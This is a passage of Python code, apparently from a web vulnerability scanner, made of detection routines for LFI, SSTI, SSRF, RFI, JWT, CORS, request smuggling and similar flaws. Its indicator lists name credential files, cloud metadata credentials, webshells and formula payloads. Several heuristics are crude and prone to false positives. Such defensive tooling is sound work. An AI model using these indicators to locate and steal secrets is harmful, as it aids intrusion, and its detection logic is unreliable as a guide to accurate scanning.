    def _detect_lfi(self, payload: str, content: str, headers: Dict) -> bool:
        """Enhanced Local File Inclusion detection."""
        content_lower = content.lower()
        
        # Linux/Unix file indicators
        unix_indicators = [
            'root:x:0:0:', '/bin/bash', '/bin/sh', '/etc/passwd',
            'daemon:x:', 'nobody:x:', 'www-data:x:',
            '[global]', 'for 16-bit app support'  # Windows files
        ]
        
        # Windows file indicators
        windows_indicators = [
            '[boot loader]', '[operating systems]', 'multi(0)disk(0)',
            'systemroot', 'windir', 'boot.ini'
        ]
        
        # Configuration file indicators
        config_indicators = [
            'mysql_connect', 'mysqli_connect', 'pg_connect',
            'oracle_connect', 'database_host', 'db_password',
            'secret_key', 'encryption_key'
        ]
        
        all_indicators = unix_indicators + windows_indicators + config_indicators
        
        for indicator in all_indicators:
            if indicator.lower() in content_lower:
                return True
        
        # PHP wrapper detection
        if 'php://' in payload and ('expect://' in content or 'file://' in content):
            return True
        
        return False

    def _detect_command_injection(self, payload: str, content: str, headers: Dict) -> bool:
        """Advanced OS command injection detection."""
        content_lower = content.lower()
        
        # Command output indicators
        cmd_indicators = [
            'uid=', 'gid=', 'groups=',  # id command
            'www-data', 'apache', 'nginx',  # web server users
            'kernel', 'linux', 'ubuntu', 'centos',  # uname output
            'volume in drive', 'directory of',  # Windows dir
            'total', '-rw-r--r--',  # ls -la output
            'ping statistics', 'packets transmitted',  # ping output
            'listening on port',  # netstat output
        ]
        
        for indicator in cmd_indicators:
            if indicator in content_lower:
                return True
        
        # Error indicators from failed commands
        error_indicators = [
            'command not found', 'permission denied',
            'no such file or directory', 'access denied',
            'the system cannot find the file'
        ]
        
        for error in error_indicators:
            if error in content_lower:
                return True
        
        return False

    def _detect_ssrf(self, payload: str, content: str, headers: Dict, status: int, final_url: str, original_url: str) -> bool:
        """Advanced SSRF detection with cloud metadata checks."""
        # Check for successful requests to internal/cloud services
        cloud_metadata_indicators = [
            'instance-id', 'ami-id', 'instance-type',  # AWS metadata
            'computeMetadata', 'v1/instance',  # Google Cloud
            'metadata.azure.com',  # Azure
            'latest/meta-data',  # AWS metadata path
            'security-credentials'  # AWS IAM roles
        ]
        
        content_lower = content.lower()
        for indicator in cloud_metadata_indicators:
            if indicator.lower() in content_lower:
                return True
        
        # Check for redirect to internal networks
        if final_url != original_url:
            parsed_final = urlparse(final_url)
            internal_networks = [
                '127.', '10.', '172.16.', '172.17.', '172.18.', '172.19.',
                '172.20.', '172.21.', '172.22.', '172.23.', '172.24.',
                '172.25.', '172.26.', '172.27.', '172.28.', '172.29.',
                '172.30.', '172.31.', '192.168.', '169.254.169.254'
            ]
            
            for network in internal_networks:
                if parsed_final.netloc.startswith(network):
                    return True
        
        # Check for timeout (potential successful internal request)
        if status == 0 and 'timeout' in str(headers).lower():
            return True
        
        return False

    def _detect_xxe(self, payload: str, content: str, headers: Dict) -> bool:
        """ADVANCED XXE injection detection with truly dynamic analysis."""
        import re
        
        content_lower = content.lower()
        
        # 1. Check for successful file disclosure (Linux/Unix)
        unix_file_patterns = [
            r'root:x:0:0:', r'daemon:.*:.*:', r'bin:.*:.*:',
            r'/bin/bash', r'/bin/sh', r'/bin/zsh',
            r'nobody:.*:.*:', r'www-data:.*:.*:'
        ]
        
        for pattern in unix_file_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        # 2. Check for Windows file disclosure
        windows_patterns = [
            r'\[boot loader\]', r'\[operating systems\]',
            r'c:\\windows', r'c:\\winnt', r'systemroot',
            r'c:\\users', r'\\system32\\'
        ]
        
        for pattern in windows_patterns:
            if re.search(pattern, content_lower):
                return True
        
        # 3. Dynamic out-of-band detection indicators
        # Check if payload contains external DTD/entity references
        if any(marker in payload.lower() for marker in ['<!entity', '<!doctype', 'system', 'public']):
            # Look for evidence that external entities were processed
            xxe_success_patterns = [
                'file:///', 'http://', 'https://',
                'secret', 'password', 'config', 'database',
                'api_key', 'token', 'credential'
            ]
            
            for pattern in xxe_success_patterns:
                if pattern in content_lower:
                    return True
        
        # 4. Check for XML parsing errors (indicates XXE attempt was processed)
        xxe_error_patterns = [
            r'xml.*parsing.*error', r'external.*entity',
            r'entity.*reference', r'dtd.*forbidden',
            r'entity.*expansion', r'xml.*syntax.*error',
            r'parser.*error', r'sax.*exception',
            r'dom.*exception', r'xmlreader.*error',
            r'entity.*not.*found', r'cannot.*resolve.*entity'
        ]
        
        for pattern in xxe_error_patterns:
            if re.search(pattern, content_lower):
                return True
        
        # 5. Check for billion laughs / entity expansion attack indicators
        if re.search(r'entity.*expansion|memory.*exhausted|resource.*limit', content_lower):
            return True
        
        # 6. Check for DOCTYPE processing indicators
        if '<!doctype' in payload.lower():
            # If DOCTYPE appears in response, it might have been processed
            if '<!doctype' in content_lower or 'doctype' in content_lower:
                return True
        
        # 7. Behavioral analysis - abnormal response patterns
        # XXE often causes significantly different responses
        if len(content) > 10000 and any(marker in content_lower for marker in 
            ['<?xml', 'version=', 'encoding=', 'standalone=']):
            # Large XML response after XXE payload = potential XXE
            return True
        
        # 8. Check for SSRF via XXE indicators  
        ssrf_via_xxe_patterns = [
            'aws', 'amazon', 'metadata', '169.254.169.254',
            'localhost', '127.0.0.1', 'internal', 'private'
        ]
        
        if any(marker in content_lower for marker in ssrf_via_xxe_patterns):
            if '<!entity' in payload.lower() or 'system' in payload.lower():
                return True
        
        return False

    def _detect_template_injection(self, payload: str, content: str, headers: Dict) -> bool:
        """ADVANCED SSTI detection with truly dynamic template engine analysis."""
        import re
        
        content_lower = content.lower()
        
        # 1. Mathematical expression evaluation detection (truly dynamic)
        math_payloads = {
            '{{7*7}}': ['49'],
            '${7*7}': ['49'],
            '<%=7*7%>': ['49'],
            '{{7*\'7\'}}': ['7777777', '49'],  # Python string multiplication
            '${7*\'7\'}': ['7777777'],
            '#{7*7}': ['49'],
            '${{7*7}}': ['49'],
        }
        
        for math_payload, expected_results in math_payloads.items():
            if math_payload in payload:
                for expected in expected_results:
                    if expected in content:
                        return True
        
        # 2. Template engine error detection (comprehensive)
        template_error_patterns = [
            # Python - Jinja2, Django, Mako
            r'jinja2\.exceptions', r'templatesyntaxerror', r'templateassertionerror',
            r'undefinederror', r'django\.template\.exceptions',
            r'mako\.exceptions', r'template.*syntax.*error',
            # Ruby - ERB, Slim, Haml
            r'erb.*error', r'slim.*error', r'haml.*error',
            # PHP - Twig, Smarty, Blade
            r'twig_error', r'twig.*syntax', r'smarty.*error',
            r'blade.*error', r'templatenotfound',
            # Java - Velocity, FreeMarker, Thymeleaf
            r'velocity.*error', r'freemarker.*error', r'thymeleaf.*error',
            r'parseerrorexception', r'template.*exception',
            # JavaScript - Pug, Handlebars, Mustache
            r'pug.*error', r'handlebars.*error', r'mustache.*error',
            # Generic
            r'template.*error', r'rendering.*error', r'parse.*error',
            r'syntax.*error.*template', r'variable.*not.*defined'
        ]
        
        for pattern in template_error_patterns:
            if re.search(pattern, content_lower):
                return True
        
        # 3. Check for config/environment variable exposure
        config_exposure_patterns = [
            r'<config[^>]*>', r'<class[^>]*config', r'<module[^>]*config',
            r'secret.*key', r'database.*password', r'api.*key',
            r'__globals__', r'__builtins__', r'__import__',
            r'application.*config', r'settings\..*',
        ]
        
        for pattern in config_exposure_patterns:
            if re.search(pattern, content_lower):
                # If payload contains template markers and config is exposed
                if any(marker in payload for marker in ['{{', '${', '<%=', '#{']):
                    return True
        
        # 4. Polyglot payload detection - multiple template syntaxes
        if any(marker in payload for marker in ['{{', '${', '<%=', '#{', '${{', '<#']):
            # Check for RCE indicators
            rce_indicators = [
                r'uid=\d+', r'gid=\d+', r'root:', r'/bin/bash',
                r'www-data', r'apache', r'nginx',
                r'<class.*object', r'<function', r'<module',
                r'nt authority', r'system32', r'windows'
            ]
            
            for pattern in rce_indicators:
                if re.search(pattern, content, re.IGNORECASE):
                    return True
        
        # 5. Check for sandbox escape indicators (Python-specific)
        python_ssti_indicators = [
            r'__class__', r'__mro__', r'__subclasses__',
            r'__globals__', r'__builtins__', r'__import__',
            r'<class.*\'object\'>', r'<class.*\'type\'>',
            r'<function', r'<module', r'<built-in'
        ]
        
        for pattern in python_ssti_indicators:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        # 6. Check for Java SSTI indicators (Expression Language, OGNL, etc.)
        java_ssti_indicators = [
            r'java\.lang\.runtime', r'getruntime\(\)', r'exec\(',
            r'java\.io\.', r'java\.nio\.', r'processbuilder',
            r'class\.forname', r'classloader'
        ]
        
        for pattern in java_ssti_indicators:
            if re.search(pattern, content_lower):
                return True
        
        # 7. Check for variable reflection/expansion
        # If payload contains template variable syntax, check if it was processed
        if '{{' in payload and '}}' in payload:
            # Extract variable name from payload
            var_match = re.search(r'{{(\w+)}}', payload)
            if var_match:
                var_name = var_match.group(1)
                # Check if variable was expanded in response
                if var_name not in content and len(content) > len(payload):
                    # Variable was processed (disappeared or expanded)
                    return True
        
        # 8. Behavioral analysis - response length changes
        # SSTI often causes significant response changes
        if len(content) > 5000:
            # Large response with template-like content
            if any(marker in content_lower for marker in 
                ['function', 'class ', 'module', 'object', 'method']):
                return True
        
        return False

    def _detect_nosql_injection(self, payload: str, content: str, headers: Dict, status: int) -> bool:
        """NoSQL injection detection."""
        content_lower = content.lower()
        
        nosql_indicators = [
            'mongodb', 'couchdb', 'redis', 'cassandra',
            'invalid bson', 'json parse error',
            'objectid', 'bson', 'gridfs'
        ]
        
        for indicator in nosql_indicators:
            if indicator in content_lower:
                return True
        
        # Check for boolean blind injection indicators
        if '$ne' in payload and status == 200:
            return True
        
        return False

    def _detect_ldap_injection(self, payload: str, content: str, headers: Dict) -> bool:
        """LDAP injection detection."""
        content_lower = content.lower()
        
        ldap_indicators = [
            'invalid dn syntax', 'ldap error',
            'distinguished name', 'objectclass',
            'cn=', 'ou=', 'dc=', 'ldap://'
        ]
        
        for indicator in ldap_indicators:
            if indicator in content_lower:
                return True
        
        return False

    def _detect_xpath_injection(self, payload: str, content: str, headers: Dict) -> bool:
        """XPath injection detection."""
        content_lower = content.lower()
        
        xpath_indicators = [
            'xpath syntax error', 'xpath expression',
            'xmldom', 'xml parsing', 'xpath error',
            'msxml', 'libxml'
        ]
        
        for indicator in xpath_indicators:
            if indicator in content_lower:
                return True
        
        return False

    def _detect_open_redirect(self, payload: str, headers: Dict, status: int, final_url: str) -> bool:
        """Open redirect detection."""
        if status in [301, 302, 303, 307, 308]:
            location = headers.get('location', '').lower()
            payload_lower = payload.lower()
            
            # Check if redirect location contains our payload
            if payload_lower in location:
                return True
            
            # Check for external redirects
            if location.startswith(('http://', 'https://', '//')):
                return True
        
        return False

    def _detect_crlf_injection(self, payload: str, headers: Dict) -> bool:
        """CRLF injection detection."""
        # Check if our injected headers appear in response
        if '\r\n' in payload or '%0d%0a' in payload.lower():
            for header_name, header_value in headers.items():
                if 'injected' in header_value.lower():
                    return True
        
        return False

    def _detect_sensitive_file(self, filename: str, content: str, headers: Dict, status: int) -> bool:
        """Enhanced sensitive file detection."""
        if status != 200:
            return False
        
        content_lower = content.lower()
        filename_lower = filename.lower()
        
        # File-specific indicators
        file_indicators = {
            '.env': ['db_password', 'api_key', 'secret', '_key='],
            '.git/config': ['[core]', 'repositoryformatversion', 'remote "origin"'],
            'web.config': ['<configuration>', '<appsettings>', 'connectionstrings'],
            '.htaccess': ['rewriteengine', 'rewriterule', 'options'],
            'composer.json': ['"name":', '"require":', '"autoload":'],
            'package.json': ['"name":', '"version":', '"dependencies":'],
            'robots.txt': ['user-agent:', 'disallow:', 'allow:'],
            'sitemap.xml': ['<urlset', '<url>', '<loc>'],
            'crossdomain.xml': ['<cross-domain-policy>', '<allow-access-from'],
            'id_rsa': ['-----begin', 'private key', '-----end'],
            'backup.sql': ['insert into', 'create table', 'mysqldump']
        }
        
        for file_pattern, indicators in file_indicators.items():
            if file_pattern in filename_lower:
                for indicator in indicators:
                    if indicator in content_lower:
                        return True
        
        # Generic sensitive content patterns
        sensitive_patterns = [
            'password', 'secret', 'private_key', 'api_key',
            'database', 'config', 'admin', 'root',
            'ssh-rsa', 'ssh-dss', 'connection string'
        ]
        
        for pattern in sensitive_patterns:
            if pattern in content_lower and len(content) > 50:
                return True
        
        return False

    # ═══════════════════════════════════════════════════════════════════════════
    # 🔥 ADVANCED DYNAMIC DETECTION METHODS - Truly Dynamic & Comprehensive
    # ═══════════════════════════════════════════════════════════════════════════

    def _detect_rfi(self, payload: str, content: str, headers: Dict, status: int) -> bool:
        """ADVANCED RFI detection with truly dynamic remote resource analysis."""
        import re
        
        if status not in [200, 201, 301, 302]:
            return False
        
        content_lower = content.lower()
        
        # 1. Check for successful remote include indicators
        # If RFI payload includes a known remote file, look for its content
        remote_urls = ['http://', 'https://', 'ftp://', '//']
        has_remote_url = any(url in payload.lower() for url in remote_urls)
        
        if not has_remote_url:
            return False
        
        # 2. Extract expected remote content patterns
        # Common RFI test payloads contain PHP code
        php_execution_indicators = [
            r'<\?php', r'<?=', r'phpinfo\(',
            r'system\(', r'exec\(', r'passthru\(',
            r'\$_get', r'\$_post', r'\$_server'
        ]
        
        for pattern in php_execution_indicators:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        # 3. Check for remote file inclusion success markers
        rfi_success_patterns = [
            # Pastebin/external paste service detection
            r'pastebin\.com', r'raw\.githubusercontent\.com',
            r'gist\.github\.com', r'paste\..*\.com',
            # PHP shell indicators
            r'c99shell', r'r57shell', r'b374k', r'wso shell',
            r'symlink.*shell', r'file upload', r'back connect',
            # Common webshell functions
            r'shell_exec', r'eval\(base64_decode',
            r'base64_decode.*eval', r'assert.*\$_',
            # Remote code execution evidence
            r'command executed', r'output:', r'result:',
            # File manager indicators
            r'file manager', r'chmod.*777', r'mkdir.*www'
        ]
        
        for pattern in rfi_success_patterns:
            if re.search(pattern, content_lower, re.IGNORECASE):
                return True
        
        # 4. Check for errors indicating RFI attempt
        rfi_error_patterns = [
            r'failed to open stream', r'no such file or directory',
            r'failed opening.*for inclusion', r'include.*failed',
            r'require.*failed', r'url file-access is disabled',
            r'allow_url_include.*off', r'allow_url_fopen.*off'
        ]
        
        for pattern in rfi_error_patterns:
            if re.search(pattern, content_lower, re.IGNORECASE):
                # Errors mean server processed RFI attempt
                return True
        
        # 5. Check for content from known RFI test URLs
        # If payload contains specific domain, check if that domain's content appears
        try:
            from urllib.parse import urlparse
            if 'http' in payload.lower():
                parsed = urlparse(payload)
                if parsed.netloc and parsed.netloc in content_lower:
                    return True
        except:
            pass
        
        # 6. Check response length changes (heuristic)
        # Successful RFI often results in significantly longer responses
        if len(content) > 50000:  # Unusually large response
            if any(ind in content_lower for ind in ['<?php', 'function', 'class ', 'eval(']):
                return True
        
        return False

    def _detect_idor(self, url: str, original_response: str, test_responses: Dict, status_codes: Dict) -> bool:
        """ADVANCED IDOR detection with behavioral analysis and data leakage detection."""
        import re
        
        # 1. Detect sequential ID patterns in URL
        id_patterns = [
            r'/users?/(\d+)',
            r'/accounts?/(\d+)',  
            r'/profiles?/(\d+)',
            r'/documents?/(\d+)',
            r'/files?/(\d+)',
            r'/orders?/(\d+)',
            r'[?&]id=(\d+)',
            r'[?&]user_id=(\d+)',
            r'[?&]account=(\d+)',
            r'[?&]doc=(\d+)'
        ]
        
        current_id = None
        for pattern in id_patterns:
            match = re.search(pattern, url, re.IGNORECASE)
            if match:
                current_id = match.group(1)
                break
        
        if not current_id:
            return False
        
        # 2. Check if modifying ID grants unauthorized access
        for test_id, response in test_responses.items():
            if test_id == current_id:
                continue
            
            status = status_codes.get(test_id, 404)
            
            # Success code with different ID = IDOR
            if status == 200 and response:
                # 3. Check for data leakage indicators
                sensitive_data_patterns = [
                    # Personal information
                    r'email["\s:]+[\w\.-]+@[\w\.-]+',
                    r'"phone"\s*:\s*"[\d\-\+\(\) ]+"',
                    r'"address"\s*:\s*"[^"]+"',
                    r'"ssn"\s*:\s*"\d{3}-\d{2}-\d{4}"',
                    # Financial data
                    r'"balance"\s*:\s*\d+',
                    r'"credit_card"\s*:\s*"\d{4}[\*\s]\d{4}[\*\s]\d{4}[\*\s]\d{4}"',
                    r'"account_number"\s*:\s*"\d+"',
                    # Authentication data
                    r'"password"\s*:\s*"[^"]+"',
                    r'"token"\s*:\s*"[a-zA-Z0-9]+"',
                    r'"api_key"\s*:\s*"[a-zA-Z0-9]+"',
                    # User profiles
                    r'"username"\s*:\s*"[^"]+"',
                    r'"first_name"\s*:\s*"[^"]+"',
                    r'"last_name"\s*:\s*"[^"]+"',
                    r'"dob"\s*:\s*"\d{4}-\d{2}-\d{2}"'
                ]
                
                for pattern in sensitive_data_patterns:
                    if re.search(pattern, response, re.IGNORECASE):
                        # Found sensitive data with different ID = IDOR vulnerability
                        return True
                
                # 4. Compare response similarity with original
                # If responses are structurally similar but with different data
                response_lower = response.lower()
                original_lower = original_response.lower()
                
                # Check for JSON/XML structure
                is_json = '{' in response and '}' in response
                is_xml = '<' in response and '>' in response
                
                if is_json or is_xml:
                    # Different content but same structure = likely IDOR
                    original_keys = set(re.findall(r'"(\w+)":', original_lower))
                    response_keys = set(re.findall(r'"(\w+)":', response_lower))
                    
                    # If keys are similar (same structure) but values different
                    if len(original_keys & response_keys) > 3:  # At least 3 common keys
                        # Check if actual values differ
                        if response != original_response:
                            return True
        
        return False

    def _detect_jwt_vulnerabilities(self, headers: Dict, cookies: str, content: str) -> List[Dict]:
        """ADVANCED JWT vulnerability detection with comprehensive algorithm and signature checks."""
        import re
        import base64
        
        vulnerabilities = []
        
        # 1. Extract JWT tokens from headers, cookies, and content
        jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
        
        jwt_tokens = []
        
        # Check Authorization header
        auth_header = headers.get('authorization', headers.get('Authorization', ''))
        if auth_header:
            tokens = re.findall(jwt_pattern, auth_header)
            jwt_tokens.extend(tokens)
        
        # Check cookies
        if cookies:
            tokens = re.findall(jwt_pattern, cookies)
            jwt_tokens.extend(tokens)
        
        # Check response content
        tokens = re.findall(jwt_pattern, content)
        jwt_tokens.extend(tokens)
        
        for token in jwt_tokens:
            try:
                parts = token.split('.')
                if len(parts) != 3:
                    continue
                
                header_b64, payload_b64, signature = parts
                
                # Decode header and payload
                def decode_jwt_part(part):
                    # Add padding if needed
                    padding = 4 - len(part) % 4
                    if padding != 4:
                        part += '=' * padding
                    try:
                        return base64.urlsafe_b64decode(part).decode('utf-8')
                    except:
                        return None
                
                header_json = decode_jwt_part(header_b64)
                payload_json = decode_jwt_part(payload_b64)
                
                if not header_json or not payload_json:
                    continue
                
                # 2. Check for 'none' algorithm vulnerability
                if '"alg":"none"' in header_json.lower() or '"alg": "none"' in header_json.lower():
                    vulnerabilities.append({
                        'type': 'JWT None Algorithm',
                        'severity': 'CRITICAL',
                        'details': 'JWT uses "none" algorithm - signature verification bypassed',
                        'token': token[:50] + '...'
                    })
                
                # 3. Check for weak algorithms
                weak_algos = ['hs256', 'hs384', 'hs512']  # HMAC can be brute-forced
                for algo in weak_algos:
                    if f'"alg":"{algo}"' in header_json.lower():
                        vulnerabilities.append({
                            'type': 'JWT Weak Algorithm',
                            'severity': 'MEDIUM',
                            'details': f'JWT uses weak algorithm: {algo.upper()}',
                            'token': token[:50] + '...'
                        })
                
                # 4. Check for missing or empty signature
                if not signature or signature == '':
                    vulnerabilities.append({
                        'type': 'JWT Missing Signature',
                        'severity': 'CRITICAL',
                        'details': 'JWT has no signature - can be forged',
                        'token': token[:50] + '...'
                    })
                
                # 5. Check for sensitive data in payload
                sensitive_patterns = [
                    'password', 'secret', 'api_key', 'private_key',
                    'ssn', 'credit_card', 'cvv'
                ]
                
                for pattern in sensitive_patterns:
                    if pattern in payload_json.lower():
                        vulnerabilities.append({
                            'type': 'JWT Sensitive Data Exposure',
                            'severity': 'HIGH',
                            'details': f'JWT payload contains sensitive data: {pattern}',
                            'token': token[:50] + '...'
                        })
                
                # 6. Check for long expiration times
                import json
                try:
                    payload_data = json.loads(payload_json)
                    if 'exp' in payload_data:
                        exp = payload_data['exp']
                        import time
                        current_time = int(time.time())
                        if exp - current_time > 31536000:  # More than 1 year
                            vulnerabilities.append({
                                'type': 'JWT Long Expiration',
                                'severity': 'MEDIUM',
                                'details': 'JWT has expiration > 1 year - security risk',
                                'token': token[:50] + '...'
                            })
                except:
                    pass
                
            except Exception as e:
                continue
        
        return vulnerabilities

    def _detect_graphql_injection(self, payload: str, content: str, headers: Dict, status: int) -> bool:
        """ADVANCED GraphQL injection detection with introspection and mutation analysis."""
        import re
        
        content_lower = content.lower()
        
        # 1. Check for GraphQL-specific error messages
        graphql_errors = [
            r'graphql.*error', r'syntax error.*graphql',
            r'query.*parse.*error', r'unexpected.*graphql',
            r'__schema', r'__type', r'__typename',
            r'introspection.*disabled', r'introspection.*not.*allowed'
        ]
        
        for pattern in graphql_errors:
            if re.search(pattern, content_lower):
                return True
        
        # 2. Check for successful introspection query
        introspection_indicators = [
            '"__schema"', '"__type"', '"querytype"',
            '"mutationtype"', '"subscriptiontype"',
            '"types":', '"fields":', '"interfaces":'
        ]
        
        if status == 200:
            for indicator in introspection_indicators:
                if indicator in content_lower:
                    return True
        
        # 3. Check for injection in GraphQL queries
        if any(marker in payload.lower() for marker in ['query', 'mutation', 'subscription']):
            # Look for SQL injection in GraphQL context
            sql_in_graphql = [
                'union select', 'or 1=1', "' or '1'='1",
                'union all select', 'waitfor delay'
            ]
            
            for sql_pattern in sql_in_graphql:
                if sql_pattern in payload.lower():
                    # Check if SQL error leaked through GraphQL
                    sql_errors = ['sql', 'mysql', 'postgresql', 'syntax error', 'database']
                    if any(err in content_lower for err in sql_errors):
                        return True
        
        # 4. Check for NoSQL injection in GraphQL
        nosql_patterns = [r'\$ne', r'\$gt', r'\$regex', r'\$where']
        for pattern in nosql_patterns:
            if re.search(pattern, payload):
                if any(ind in content_lower for ind in ['mongodb', 'nosql', 'error', 'exception']):
                    return True
        
        # 5. Check for batching attack indicators
        if 'query' in payload.lower() and payload.count('{') > 5:
            # Multiple queries in one request
            if len(content) > 100000:  # Very large response
                return True
        
        # 6. Check for field duplication attack
        field_pattern = re.findall(r'\b(\w+)\s*\{', payload)
        if len(field_pattern) != len(set(field_pattern)):
            # Duplicate fields found
            if 'error' not in content_lower and len(content) > 1000:
                return True
        
        return False

    def _detect_cors_misconfiguration(self, headers: Dict, origin_tested: str) -> bool:
        """ADVANCED CORS misconfiguration detection with comprehensive origin validation."""
        import re
        
        # 1. Check for Access-Control-Allow-Origin header
        acao = headers.get('access-control-allow-origin', 
                          headers.get('Access-Control-Allow-Origin', ''))
        
        if not acao:
            return False
        
        acao_lower = acao.lower()
        
        # 2. Critical: Wildcard with credentials
        acac = headers.get('access-control-allow-credentials',
                          headers.get('Access-Control-Allow-Credentials', ''))
        
        if acao == '*' and acac.lower() == 'true':
            return True  # CRITICAL: Wildcard + credentials
        
        # 3. Reflected origin vulnerability
        if origin_tested and acao == origin_tested:
            # Server reflects any origin back
            if acac.lower() == 'true':
                return True  # Server accepts any origin with credentials
        
        # 4. Null origin accepted
        if acao.lower() == 'null':
            if acac.lower() == 'true':
                return True  # Null origin with credentials is dangerous
        
        # 5. Check for insufficient validation
        dangerous_patterns = [
            r'.*\..*',  # Regex-like patterns that might be too permissive
            r'https?://[^/]*$'  # Any subdomain accepted
        ]
        
        # 6. Check if origin validation is broken
        if origin_tested:
            # Test if evil.com is reflected
            if 'evil' in origin_tested.lower() and origin_tested in acao:
                return True
            
            # Test if null origin is reflected
            if origin_tested.lower() == 'null' and acao.lower() == 'null':
                return True
        
        # 7. Check for pre-domain wildcard
        if acao.startswith('http') and '*' in acao:
            return True  # Wildcards in specific origins are dangerous
        
        # 8. Multiple origins allowed improperly
        if ',' in acao:
            return True  # Multiple origins in single header (invalid CORS)
        
        return False

    def _detect_http_request_smuggling(self, response_headers: Dict, status: int, content: str) -> bool:
        """ADVANCED HTTP Request Smuggling detection with CL.TE and TE.CL analysis."""
        import re
        
        # 1. Check for conflicting Content-Length and Transfer-Encoding headers
        cl = response_headers.get('content-length', response_headers.get('Content-Length', ''))
        te = response_headers.get('transfer-encoding', response_headers.get('Transfer-Encoding', ''))
        
        if cl and te:
            # Both headers present - potential CL.TE or TE.CL desync
            return True
        
        # 2. Check for duplicate Content-Length headers
        cl_count = sum(1 for k in response_headers.keys() if k.lower() == 'content-length')
        if cl_count > 1:
            return True  # Duplicate CL headers can cause desync
        
        # 3. Check for malformed Transfer-Encoding
        if te:
            te_lower = te.lower()
            # Check for spaces or unusual formatting
            if '  ' in te or '\t' in te or te != te.strip():
                return True
            
            # Check for unknown transfer encodings
            valid_encodings = ['chunked', 'compress', 'deflate', 'gzip', 'identity']
            if not any(enc in te_lower for enc in valid_encodings):
                return True
        
        # 4. Check for HTTP response splitting indicators
        suspicious_patterns = [
            r'http/\d\.\d\s+\d{3}',  # Additional HTTP response in content
            r'\r\n\r\n.*http/\d\.\d',  # Response splitting
            r'content-length:.*content-length:',  # Duplicate CL in content
        ]
        
        content_lower = content.lower()
        for pattern in suspicious_patterns:
            if re.search(pattern, content_lower):
                return True
        
        # 5. Check for inconsistent response length
        if cl:
            try:
                expected_length = int(cl)
                actual_length = len(content.encode('utf-8'))
                # If lengths differ significantly, might indicate smuggling
                if abs(expected_length - actual_length) > 100:
                    return True
            except:
                pass
        
        return False

    def _detect_csv_injection(self, payload: str, content: str, headers: Dict) -> bool:
        """ADVANCED CSV injection detection with formula injection analysis."""
        import re
        
        # 1. Check for CSV injection payloads
        csv_injection_prefixes = ['=', '+', '-', '@', '\t', '\r']
        
        payload_starts_with_formula = any(payload.startswith(prefix) for prefix in csv_injection_prefixes)
        
        if not payload_starts_with_formula:
            return False
        
        # 2. Check if response is CSV format
        content_type = headers.get('content-type', headers.get('Content-Type', '')).lower()
        is_csv = 'csv' in content_type or 'text/csv' in content_type
        
        # Check for CSV structure in content
        has_csv_structure = ',' in content and '\n' in content
        
        if not (is_csv or has_csv_structure):
            return False
        
        # 3. Check if injected formula appears in response
        if payload in content:
            return True
        
        # 4. Check for Excel formula functions in response
        excel_functions = [
            'sum(', 'if(', 'cmd|', 'system(', 'exec(',
            'dde(', 'hyperlink(', 'importxml(', 'webservice(',
            'filterxml(', 'concat('
        ]
        
        content_lower = content.lower()
        for func in excel_functions:
            if func in content_lower:
                return True
        
        # 5. Check for DDE (Dynamic Data Exchange) injection
        dde_patterns = [
            r'@SUM\(', r'=cmd\|', r'=.*!\s*.*!',
            r'-.*!\s*.*!', r'\+.*!\s*.*!'
        ]
        
        for pattern in dde_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False

    def _detect_host_header_injection(self, original_host: str, injected_host: str, response: str, headers: Dict) -> bool:
        """ADVANCED Host header injection detection with password reset and cache poisoning analysis."""
        import re
        
        if not injected_host or injected_host == original_host:
            return False
        
        response_lower = response.lower()
        
        # 1. Check if injected host appears in response
        if injected_host.lower() in response_lower:
            # Critical: Injected host reflected in response
            
            # Check for specific dangerous contexts
            dangerous_contexts = [
                # Password reset links
                (r'reset.*password.*' + re.escape(injected_host), 'Password Reset Poisoning'),
                (r'href=["\']https?://' + re.escape(injected_host), 'Link Injection'),
                # Absolute URLs
                (r'https?://' + re.escape(injected_host) + r'/[\w/]+', 'Absolute URL Poisoning'),
                # JavaScript injection
                (r'<script.*' + re.escape(injected_host), 'Script Injection via Host'),
                # META refresh
                (r'<meta.*refresh.*' + re.escape(injected_host), 'META Refresh Poisoning'),
            ]
            
            for pattern, vuln_type in dangerous_contexts:
                if re.search(pattern, response, re.IGNORECASE):
                    return True
            
            # Generic reflection in HTML
            if '<' in response and '>' in response:  # HTML content
                return True
        
        # 2. Check for Host header in Location header (open redirect)
        location = headers.get('location', headers.get('Location', ''))
        if location and injected_host in location:
            return True
        
        # 3. Check for cache poisoning indicators
        cache_headers = ['x-cache', 'x-cache-status', 'cf-cache-status', 'age']
        is_cached = any(h in headers for h in cache_headers)
        
        if is_cached and injected_host.lower() in response_lower:
            return True  # Cached response with injected host = cache poisoning
        
        # 4. Check for SSRF via Host header
        internal_indicators = [
            'localhost', '127.0.0.1', '10.', '192.168.', '172.16.'
        ]
        
        if any(indicator in injected_host.lower() for indicator in internal_indicators):
            # Check if internal resource was accessed
            if 'error' not in response_lower and len(response) > 100:
                return True
        
        return False

    def _detect_websocket_vulnerabilities(self, ws_url: str, headers: Dict, messages: List[str]) -> List[Dict]:
        """ADVANCED WebSocket vulnerability detection with CSWSH and injection analysis."""
        import re
        
        vulnerabilities = []
        
        # 1. Check for Cross-Site WebSocket Hijacking (CSWSH)
        origin = headers.get('origin', headers.get('Origin', ''))
        sec_websocket_key = headers.get('sec-websocket-key', headers.get('Sec-WebSocket-Key', ''))
        
        if not origin:
            vulnerabilities.append({
                'type': 'CSWSH - Missing Origin Check',
                'severity': 'HIGH',
                'details': 'WebSocket connection accepted without Origin validation'
            })
        
        if not sec_websocket_key:
            vulnerabilities.append({
                'type': 'WebSocket Insecure Handshake',
                'severity': 'MEDIUM',
                'details': 'Missing Sec-WebSocket-Key header'
            })
        
        # 2. Check for injection vulnerabilities in WebSocket messages
        for msg in messages:
            msg_lower = msg.lower()
            
            # SQL injection in WebSocket
            sql_patterns = [
                r"'.*or.*'.*'.*=.*'", r'union.*select',
                r'drop.*table', r'insert.*into'
            ]
            
            for pattern in sql_patterns:
                if re.search(pattern, msg_lower):
                    vulnerabilities.append({
                        'type': 'SQL Injection via WebSocket',
                        'severity': 'CRITICAL',
                        'details': f'SQL injection pattern in message: {msg[:50]}...'
                    })
                    break
            
            # XSS in WebSocket
            xss_patterns = [
                r'<script', r'javascript:', r'onerror=',
                r'<img.*src', r'<iframe'
            ]
            
            for pattern in xss_patterns:
